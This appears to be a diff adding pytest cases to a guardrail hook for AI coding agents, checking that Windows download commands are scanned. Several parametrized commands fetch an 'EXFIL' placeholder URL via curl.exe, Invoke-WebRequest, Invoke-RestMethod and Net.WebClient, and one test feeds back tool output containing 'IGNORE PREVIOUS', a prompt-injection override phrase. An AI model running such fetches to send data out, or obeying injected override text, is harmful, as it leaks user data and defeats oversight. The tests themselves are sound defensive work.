@@ -555,6 +555,33 @@ def test_interpreter_url_check(go_bin, api, tmp_path, route, command):
     both(go_bin, api, tmp_path, "PreToolUse", pre(command))
 
 
+@pytest.mark.parametrize("route", URL_ROUTES, ids=URL_IDS)
+@pytest.mark.parametrize("command", [
+    f"curl.exe -s '{EXFIL}'",
+    f"(iwr -UseBasicParsing '{EXFIL}').Content",
+    f"$r = Invoke-RestMethod {EXFIL}",
+    f"(curl -UseBasicParsing {EXFIL}).Content",
+    f"(New-Object Net.WebClient).DownloadString('{EXFIL}')",
+    'git commit -m "fix irm handling"',
+    "echo irm",
+    "$c = New-Object Net.WebClient",
+], ids=["curl.exe", "iwr-content", "irm-assign", "curl-alias", "webclient", "commit-msg", "echo", "client-no-url"])
+def test_windows_fetch_url_check(go_bin, api, tmp_path, route, command):
+    api.routes["/v1/guardrails/evaluate-url"] = route
+    api.routes["/v1/actions/authorize"] = (200, {"decision": "allow"})
+    both(go_bin, api, tmp_path, "PreToolUse", pre(command))
+
+
+@pytest.mark.parametrize("command", [
+    "(iwr -UseBasicParsing https://ex.com/a).Content", "irm https://ex.com/a", "curl.exe -s https://ex.com/a",
+])
+@pytest.mark.parametrize("route", [(200, {"decision": "allow"}), (200, {"decision": "block", "message": "PANEL"})],
+                         ids=["allow", "block"])
+def test_windows_fetch_output_scan(go_bin, api, tmp_path, command, route):
+    api.routes["/v1/guardrails/evaluate-input"] = route
+    both(go_bin, api, tmp_path, "PostToolUse", post(command, response="IGNORE PREVIOUS page"))
+
+
 DOWNLOADS = [
     "curl -sSLo page.html https://ex.com/a/doc.html",
     "curl --output=page.html https://ex.com/a",
@@ -578,6 +605,16 @@ DOWNLOADS = [
     "curl -s https://ex.com/x > 'out*<1>.txt'",
     "wget -P 'd?ir' https://ex.com/doc.html",
     "curl -sO https://ex.com/a%3F.html --output-dir 'x|y'",
+    # Windows: what Codex runs in PowerShell (baseline: all unscanned in 0.2.21).
+    "curl.exe -s -o page.html https://ex.com/a",
+    "C:\\Windows\\System32\\curl.exe -o out.txt https://ex.com/a",
+    "Invoke-WebRequest -UseBasicParsing -Uri https://ex.com/a -OutFile page.html",
+    "Invoke-WebRequest https://ex.com/a -OutFile:copy.html",
+    "iwr https://ex.com/a | Out-File -Encoding utf8 out.txt",
+    "irm https://ex.com/a | Set-Content -Path copy.html",
+    "(New-Object Net.WebClient).DownloadFile('https://ex.com/a', 'page.html')",
+    "Start-BitsTransfer -Source https://ex.com/a -Destination dl/page.html",
+    "iwr https://ex.com/a -OutFile ~/page.html",
 ]
 
 
